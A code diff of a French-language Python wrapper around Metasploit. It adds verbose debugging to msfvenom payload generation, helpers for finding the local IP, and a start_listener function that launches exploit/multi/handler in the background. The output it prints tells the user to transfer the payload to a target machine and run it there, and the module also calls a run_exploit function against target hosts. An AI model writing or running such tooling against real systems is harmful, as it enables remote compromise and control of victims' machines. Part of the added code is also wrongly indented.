@@ -16,10 +16,20 @@ from datetime import datetime
 def check_metasploit_installed():
     """Vérifie si Metasploit est installé sur le système"""
     try:
-        result = subprocess.run(['msfconsole', '--version'], 
+        # Test msfconsole
+        result1 = subprocess.run(['msfconsole', '--version'], 
                               capture_output=True, text=True, timeout=10)
-        return result.returncode == 0
-    except (FileNotFoundError, subprocess.TimeoutExpired):
+        
+        # Test msfvenom  
+        result2 = subprocess.run(['msfvenom', '--help'], 
+                              capture_output=True, text=True, timeout=10)
+        
+        print(f"DEBUG: msfconsole return code: {result1.returncode}")
+        print(f"DEBUG: msfvenom return code: {result2.returncode}")
+        
+        return result1.returncode == 0 and result2.returncode == 0
+    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
+        print(f"DEBUG: Exception dans check_metasploit_installed: {e}")
         return False
 
 def get_exploit_info(exploit_name):
@@ -51,6 +61,11 @@ def list_payloads():
 
 def generate_payload(payload_type, lhost, lport, format_type="exe"):
     """Génère un payload avec msfvenom"""
+    print(f"DEBUG: Génération payload - {payload_type}, {lhost}:{lport}, format:{format_type}")
+    
+    # Forcer l'utilisation de msfvenom (pas de simulation)
+    filename = f'payload_{int(time.time())}.{format_type}'
+    
     try:
         cmd = [
             'msfvenom',
@@ -58,12 +73,39 @@ def generate_payload(payload_type, lhost, lport, format_type="exe"):
             f'LHOST={lhost}',
             f'LPORT={lport}',
             '-f', format_type,
-            '-o', f'payload_{int(time.time())}.{format_type}'
+            '-o', filename
         ]
+        
+        print(f"DEBUG: Commande: {' '.join(cmd)}")
+        
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-        return result.stdout if result.returncode == 0 else result.stderr
+        
+        print(f"DEBUG: Return code: {result.returncode}")
+        print(f"DEBUG: STDOUT: {result.stdout[:200]}...")
+        print(f"DEBUG: STDERR: {result.stderr[:200]}...")
+        
+        if result.returncode == 0:
+            return f"""✅ Payload généré avec succès !
+
+Fichier: {filename}
+Commande utilisée: {' '.join(cmd)}
+
+Sortie msfvenom:
+{result.stderr}
+
+Le fichier a été créé dans le répertoire courant.
+"""
+        else:
+            return f"""❌ Erreur lors de la génération:
+
+Commande: {' '.join(cmd)}
+Code retour: {result.returncode}
+Erreur: {result.stderr}
+"""
+            
     except Exception as e:
-        return f"Erreur lors de la génération du payload : {e}"
+        print(f"DEBUG: Exception: {e}")
+        return f"❌ Erreur lors de la génération du payload : {e}"
 
 def run_exploit(exploit_path, target_host, target_port, payload_type, lhost, lport):
     """Lance un exploit contre une cible"""
@@ -280,3 +322,81 @@ if __name__ == "__main__":
         print("Payloads disponibles listés")
         
     print("\nModule Metasploit prêt à être utilisé!")
+
+    def get_local_ip():
+        """Détecte automatiquement l'IP locale"""
+        try:
+            import socket
+            # Connexion temporaire pour obtenir l'IP locale
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            return local_ip
+        except Exception:
+        # Fallback
+            try:
+                import subprocess
+                result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
+                return result.stdout.strip().split()[0]
+            except:
+                return "127.0.0.1"
+
+def get_network_interfaces():
+    """Liste les interfaces réseau disponibles"""
+    interfaces = {}
+    try:
+        import subprocess
+        # Linux/Mac
+        result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True)
+        if result.returncode != 0:
+            # Essayer ifconfig
+            result = subprocess.run(['ifconfig'], capture_output=True, text=True)
+        
+        # Parser basique pour extraire les IPs
+        lines = result.stdout.split('\n')
+        current_interface = None
+        
+        for line in lines:
+            if 'inet ' in line and '127.0.0.1' not in line:
+                ip = line.split('inet ')[1].split()[0].split('/')[0]
+                if current_interface:
+                    interfaces[current_interface] = ip
+    except:
+        pass
+    
+    return interfaces
+
+def start_listener(payload_type, lhost, lport):
+    """Démarre un listener pour recevoir les connexions"""
+    try:
+        commands = [
+            'use exploit/multi/handler',
+            f'set payload {payload_type}',
+            f'set LHOST {lhost}',
+            f'set LPORT {lport}',
+            'set ExitOnSession false',
+            'exploit -j',
+            'jobs'
+        ]
+        
+        cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        
+        return f"""
+🎧 LISTENER DÉMARRÉ
+==================
+Payload: {payload_type}
+Écoute sur: {lhost}:{lport}
+Mode: Background job
+
+Résultat:
+{result.stdout if result.returncode == 0 else result.stderr}
+
+⚠️ ÉTAPES SUIVANTES:
+1. Transférez le payload sur la machine cible
+2. Exécutez le payload sur la cible
+3. Revenez ici pour voir les connexions
+"""
+    except Exception as e:
+        return f" Erreur listener: {e}"
